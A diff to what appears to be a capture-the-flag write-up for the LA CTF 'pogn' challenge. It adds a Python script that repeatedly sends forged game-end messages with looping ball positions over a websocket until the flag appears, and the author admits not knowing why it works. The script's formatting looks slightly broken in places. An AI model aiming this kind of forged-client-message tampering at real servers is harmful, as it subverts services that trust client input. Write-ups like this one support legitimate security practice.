@@ -220,5 +220,23 @@ hits a score of 100
 
 - I decided to change the message code to GAME_END[2] and I started getting ball pos within the range of 0 - 50 till I got the flag.I really don't know the logic behind my answer but it takes time for the script to get the flag because of the numbers.You might need to try a couple of times to get the flag.Oops,what a mysterious solution  to a mysterious challenge.
 
-  
-  
+ ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/2b2f4b80-307c-4fba-9658-2b95fbe35153)
+      
+      #! /usr/bin/env python3                                         
+      import websockets                                               
+      import asyncio                                                  
+      import json                                                     
+      async def connect_to_websocket():                                     
+            uri = "ws://pogn.chall.lac.tf/ws"                               
+            async with websockets.connect(uri) as websocket:                    
+                  for i in range(-10000,10000):                                         
+                      resp = await websocket.recv()
+                      print("First resp:"+resp)                                       
+                      value: str = json.dumps([2,[[i,i],[i,i]]])                      
+                      print("Value:"+value)                                           
+                      await websocket.send(value)                                     
+                      resp =await websocket.recv()                                    
+                      print(f"2nd resp: {resp}")
+                      if "lactf" in resp:                                                         n   
+                          exit()
+                                                                                                                                asyncio.get_event_loop().run_until_complete(connect_to_websocket())
